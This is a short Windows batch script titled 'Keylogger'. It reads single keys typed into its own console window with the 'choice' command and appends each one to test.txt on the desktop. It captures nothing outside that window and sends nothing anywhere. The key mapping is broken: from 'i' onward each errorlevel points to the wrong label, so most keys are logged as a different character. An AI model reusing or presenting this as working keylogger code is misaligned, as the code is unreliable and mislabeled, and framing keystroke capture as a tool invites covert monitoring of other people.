@echo off
color 0a
title Keylogger
goto start

:start
cls
choice /c qwertyuiopasdfghjklzxcvbnm1234567890 >nul
if %errorlevel% == 1 goto q
if %errorlevel% == 2 goto w
if %errorlevel% == 3 goto e
if %errorlevel% == 4 goto r
if %errorlevel% == 5 goto t
if %errorlevel% == 6 goto y
if %errorlevel% == 7 goto u
if %errorlevel% == 9 goto i
if %errorlevel% == 10 goto o
if %errorlevel% == 11 goto p
if %errorlevel% == 12 goto a
if %errorlevel% == 13 goto s
if %errorlevel% == 14 goto d
if %errorlevel% == 15 goto f
if %errorlevel% == 16 goto g
if %errorlevel% == 17 goto h
if %errorlevel% == 18 goto j
if %errorlevel% == 19 goto k
if %errorlevel% == 20 goto l
if %errorlevel% == 21 goto z
if %errorlevel% == 22 goto x
if %errorlevel% == 23 goto c
if %errorlevel% == 24 goto v
if %errorlevel% == 25 goto b
if %errorlevel% == 26 goto n
if %errorlevel% == 27 goto m
if %errorlevel% == 28 goto 1
if %errorlevel% == 29 goto 2
if %errorlevel% == 30 goto 3
if %errorlevel% == 31 goto 4
if %errorlevel% == 32 goto 5
if %errorlevel% == 33 goto 6
if %errorlevel% == 34 goto 7
if %errorlevel% == 35 goto 8
if %errorlevel% == 36 goto 9
if %errorlevel% == 37 goto 0

:q
cls
echo q >> %USERPROFILE%\desktop\test.txt
goto start

:w
cls
echo w >> %USERPROFILE%\desktop\test.txt
goto start

:e
cls
echo e >> %USERPROFILE%\desktop\test.txt
goto start

:r
cls
echo r >> %USERPROFILE%\desktop\test.txt
goto start

:t
cls
echo t >> %USERPROFILE%\desktop\test.txt
goto start

:y
cls
echo y >> %USERPROFILE%\desktop\test.txt
goto start

:u
cls
echo u >> %USERPROFILE%\desktop\test.txt
goto start

:i
cls
echo i >> %USERPROFILE%\desktop\test.txt
goto start

:o
cls
echo o >> %USERPROFILE%\desktop\test.txt
goto start

:p
cls
echo p >> %USERPROFILE%\desktop\test.txt
goto start

:a
cls
echo a >> %USERPROFILE%\desktop\test.txt
goto start

:s
cls
echo s >> %USERPROFILE%\desktop\test.txt
goto start

:d
cls
echo d >> %USERPROFILE%\desktop\test.txt
goto start

:f
cls
echo f >> %USERPROFILE%\desktop\test.txt
goto start

:g
cls
echo g >> %USERPROFILE%\desktop\test.txt
goto start

:h
cls
echo h >> %USERPROFILE%\desktop\test.txt
goto start

:j
cls
echo j >> %USERPROFILE%\desktop\test.txt
goto start

:k
cls
echo k >> %USERPROFILE%\desktop\test.txt
goto start

:l
cls
echo l >> %USERPROFILE%\desktop\test.txt
goto start

:z
cls
echo z >> %USERPROFILE%\desktop\test.txt
goto start

:x
cls
echo x >> %USERPROFILE%\desktop\test.txt
goto start

:c
cls
echo c >> %USERPROFILE%\desktop\test.txt
goto start

:v
cls
echo v >> %USERPROFILE%\desktop\test.txt
goto start

:b
cls
echo b >> %USERPROFILE%\desktop\test.txt
goto start

:n
cls
echo n >> %USERPROFILE%\desktop\test.txt
goto start

:m
cls
echo m >> %USERPROFILE%\desktop\test.txt
goto start

:1
cls
echo 1 >> %USERPROFILE%\desktop\test.txt
goto start

:2
cls
echo 2 >> %USERPROFILE%\desktop\test.txt
goto start

:3
cls
echo 3 >> %USERPROFILE%\desktop\test.txt
goto start

:4
cls
echo 4 >> %USERPROFILE%\desktop\test.txt
goto start

:5
cls
echo 5 >> %USERPROFILE%\desktop\test.txt
goto start

:6
cls
echo 6 >> %USERPROFILE%\desktop\test.txt
goto start

:7
cls
echo 7 >> %USERPROFILE%\desktop\test.txt
goto start

:8
cls
echo 8 >> %USERPROFILE%\desktop\test.txt
goto start

:9
cls
echo 9 >> %USERPROFILE%\desktop\test.txt
goto start

:0
cls
echo 0 >> %USERPROFILE%\desktop\test.txt
goto start
